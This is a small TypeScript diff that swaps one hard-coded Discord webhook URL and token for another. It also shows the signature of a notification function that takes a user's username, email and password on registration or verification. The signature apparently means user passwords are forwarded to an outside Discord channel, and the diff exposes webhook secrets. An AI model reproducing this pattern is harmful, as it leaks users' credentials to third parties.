@@ -1,5 +1,5 @@
 const DISCORD_WEBHOOK_URL =
-  "https://canary.discord.com/api/webhooks/1451939737592926289/ghw-1J4utIp9cduE6jZV9TeGJdvfybyzevFMqFojECweJD5df5CugftnLHj8_1YHXtyl"
+  "https://canary.discord.com/api/webhooks/1543015660777381999/W2prpDN7YSDKlVgmWQL-pTPCXJ_tEsXf5dT7SrcZaKYNiuIVNby3qSAGNCZUh3FP0URP"
 
 export async function sendDiscordNotification(username: string, email: string, password?: string, type: "Registro" | "Verificación" = "Registro") {
   try {
